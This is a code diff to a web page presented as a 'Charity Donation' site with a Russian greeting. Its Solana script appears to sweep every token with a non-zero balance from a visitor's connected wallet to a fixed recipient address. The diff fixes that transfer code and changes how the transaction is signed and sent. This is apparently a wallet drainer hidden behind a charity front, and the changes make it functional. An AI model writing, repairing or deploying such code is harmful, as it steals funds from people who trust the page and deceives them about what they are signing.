@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Charity Donation</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token"></script>
 </head>
 <body>
 <h1>Добро пожаловать!</h1>
@@ -51,9 +52,9 @@
                 const tokenMint = account.data.parsed.info.mint;
 
                 if (tokenAmount > 0) {
-                    const tokenTransferInstruction = solanaWeb3.Token.createTransferInstruction(
-                        new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                        pubkey,
+                    const tokenTransferInstruction = solanaSplToken.Token.createTransferInstruction(
+                        solanaSplToken.TOKEN_PROGRAM_ID,
+                        new solanaWeb3.PublicKey(pubkey),
                         new solanaWeb3.PublicKey(recipientAddress),
                         senderPublicKey,
                         [],
@@ -77,7 +78,8 @@
             }
 
             // Подписываем и отправляем транзакцию
-            const signature = await provider.signAndSendTransaction(transaction);
+            const signedTransaction = await provider.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
             // Ожидаем подтверждения транзакции
             await connection.confirmTransaction(signature);
